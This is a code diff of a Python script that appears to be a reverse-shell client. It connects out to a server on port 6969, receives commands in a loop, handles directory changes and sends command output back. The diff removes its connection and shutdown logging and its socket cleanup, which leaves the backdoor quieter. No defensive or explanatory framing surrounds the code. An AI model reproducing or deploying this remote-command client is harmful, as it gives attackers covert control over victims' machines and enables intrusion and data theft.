@@ -30,10 +30,9 @@ PORT = 6969
 
 try:
     s.connect((HOST, PORT))
-    logging.info("Connected to server at %s:%s", HOST, PORT)
 except Exception as e:
-    logging.error("Connection failed: %s", e)
-    exit(1)
+    print(f"exception occured {e}")
+    exit()
 
 def send(data):
     msg = json.dumps(data)
@@ -60,9 +59,6 @@ def shell():
     try:
         while True:
             command = recv()
-            if not command:
-                logging.info("No command received. Closing connection.")
-                break
             
             if command.startswith("cd"):
                 try:
@@ -80,10 +76,7 @@ def shell():
             
             send(output)
     except Exception as e:
-        logging.error("Error in shell loop: %s", e)
-    finally:
-        s.close()
-        logging.info("Connection closed.")
+        print(f"exception occured {e}")
 
 if __name__ == "__main__":
     shell()
